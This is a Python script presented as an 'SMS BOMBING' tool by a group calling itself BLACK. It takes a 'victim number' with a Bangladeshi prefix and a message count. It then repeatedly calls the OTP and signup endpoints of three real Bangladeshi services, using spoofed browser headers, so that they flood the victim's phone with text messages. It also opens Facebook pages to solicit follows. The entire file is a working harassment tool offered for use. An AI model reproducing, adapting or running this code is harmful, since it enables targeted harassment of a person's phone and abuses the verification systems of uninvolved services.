import requests,os
os.system("clear")
os.system("xdg-open https://facebook.com/groups/711929427000456")
logo="""
print \033[1;32m

   ██████  ██       █████   ██████ ██   ██ 
   ██   ██ ██      ██   ██ ██      ██  ██  
   ██████  ██      ███████ ██      █████   
   ██   ██ ██      ██   ██ ██      ██  ██  
   ██████  ███████ ██   ██  ██████ ██   ██ 

\033[1;33m××××××××××××××××××××××××××××××××××××××××××××××
|  \033[1;37m \033[1;31m[\033[1;32m✓\033[1;31m]\033[1;36m CREATED BY\033[1;33m     ☞  \033[1;32mPROKASH ROY      \033[1;33m  |
|  \033[1;37m \033[1;31m[\033[1;32m✓\033[1;31m]\033[1;36m FACEBOK\033[1;33m        ☞  \033[1;32mPROKASH TECH 24  \033[1;33m  |
|  \033[1;37m \033[1;31m[\033[1;32m✓\033[1;31m]\033[1;36m GITHUB\033[1;33m         ☞  \033[1;32mBLACK-TEAM-24   \033[1;33m   |
|  \033[1;37m \033[1;31m[\033[1;32m✓\033[1;31m]\033[1;36m TEAM\033[1;33m           ☞  \033[1;32mBLACK           \033[1;33m   |
|  \033[1;37m \033[1;31m[\033[1;32m✓\033[1;31m]\033[1;36m TOOLS NAME\033[1;33m     ☞  \033[1;32mSMS BOMBING      \033[1;33m  |
|  \033[1;37m \033[1;31m[\033[1;32m✓\033[1;31m]\033[1;36m TOOLS VIRSION\033[1;33m  ☞  \033[1;32m0.3             \033[1;33m   |
××××××××××××××××××××××××××××××××××××××××××××××
"""
print(logo)
follow=input("\033[1;36m1. FAST FOLLOW MY PAGE : ")

os.system("xdg-open https://www.facebook.com/profile.php?id=100086521818069")
name=input("\033[1;33m√ TYPE MY PAGE NAME : ")

num=input("\n \033[1;36m1. ENTER YOUR VICTIM NUMBER : +880")
ammo=int(input("\n \033[1;33m2. ENTER SMS AMMOUNT : "))
print("\n\n \033[1;32mALL DONE")
#print("WAIT AND SEE")

headers1={
			  "authority":"www.bioscopelive.com",
			  "method":"GET",
			  "scheme":"https",
			  "accept":"*/*",
			  "accept-encoding":"gzip, deflate, br",
			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
			  "save-data":"on",
			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
			  "sec-ch-ua-mobile":"?1",
			  "sec-ch-ua-platform":'Android',
			  "sec-fetch-dest":"empty",
			  "sec-fetch-mode":"cors",
			  "sec-fetch-site":"same-origin",
			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
			  "x-requested-with":"XMLHttpRequest"
}
url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+num+"&operator=bd-otp"
headers2={
         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+num
data={
  "name": num,
  "phoneNumber": num,
  "service": "redx"
}
headers3={
  "referer":"https://redx.com.bd/",
  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
count=0
while ammo>count:
  send1=requests.get(url1,headers=headers1)
  if send1.status_code==200:
    count+=1
    print(f"{count} BLACK-BOM Send Successfully ☑️")
  else:
    pass
  send2=requests.get(url2,headers=headers2)
  if send2.status_code==200:
    count+=1
    print(f"{count} BLACK-BOM Send Successfully ☑️")
  else:
    pass
  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
  if send3.status_code==200:
    count+=1
    print(f"{count} BLACK-BOM Send Successfully ☑️")
  else:
    pass
print("\033[1;31mALL MESSEGE SEND DONE")
